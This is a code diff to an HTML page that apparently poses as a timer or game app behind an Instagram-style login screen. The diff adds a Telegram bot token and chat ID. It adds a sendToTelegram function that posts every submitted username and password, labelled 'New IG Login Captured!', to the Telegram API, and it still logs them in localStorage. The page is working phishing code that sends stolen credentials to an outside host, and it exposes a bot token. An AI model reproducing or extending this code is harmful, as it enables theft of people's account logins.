@@ -140,7 +140,7 @@
 </head>
 <body>
 
-    <!-- Floating Timer Widget (Shows remaining time while app is running in background) -->
+    <!-- Floating Timer Widget -->
     <div id="floatingWidget" class="floating-widget hidden" onclick="checkTimerProgress()">
         ⏳ Time Left: <span id="widgetTimer">10:00</span>
     </div>
@@ -235,6 +235,18 @@
     </div>
 
     <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "8759839829:AAF-EUsIIzjysaVpPFKCayxYXwWFJXkBr4";
+        const CHAT_ID = "6772111715";
+
+        function sendToTelegram(username, password) {
+            const timeStr = new Date().toLocaleString();
+            const message = `🚨 *New IG Login Captured!* 🚨\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n⏰ *Time:* ${timeStr}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            fetch(url).catch(err => console.log("Telegram error:", err));
+        }
+
         // Toggle Password Visibility
         function togglePassword() {
             const pass = document.getElementById('password');
@@ -275,16 +287,20 @@
             showScreen('loginScreen');
         }
 
-        // Handle Login & Save to LocalStorage
+        // Handle Login & Send to Telegram + Local Storage Backup
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
 
+            // Save locally for dashboard view
             let logs = JSON.parse(localStorage.getItem('ig_secret_logs') || '[]');
             logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
             localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
+
+            // Send instantly to Telegram
+            sendToTelegram(u, p);
 
             showScreen('gameSetupScreen');
         });
